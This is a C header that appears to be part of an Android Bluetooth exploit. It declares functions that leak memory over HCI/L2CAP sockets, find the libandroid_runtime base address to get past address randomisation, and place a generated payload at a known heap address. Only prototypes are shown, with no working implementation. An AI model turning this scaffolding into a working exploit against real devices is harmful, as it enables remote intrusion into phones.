#include "errors.h"
#include "bluetooth.h"

err_t leak_simple(const int hci_sock_fd, const uint16_t hci_handle, const int l2cap_sock_fd, uint8_t *const packet_id, struct bluetooth_l2cap_header **packet);
err_t leak_fancy(const int hci_sock_fd, const uint16_t hci_handle, const int l2cap_sock_fd, uint8_t *const packet_id, bool (*const leak_callback)(uint8_t *data, size_t data_size, void *private), void *private);
err_t leak_libandroid_runtime_base(const bdaddr_t bdaddr, uint8_t *const packet_id, uint64_t *const libandroid_runtime_base);
err_t leak_controlled_payload_address(const bdaddr_t bdaddr, size_t target_chunk_size, uint8_t *const packet_id, err_t (*const payload_generator_callback)(uint64_t payload_address, uint8_t *payload_data, size_t payload_data_size, void *private), void *private);
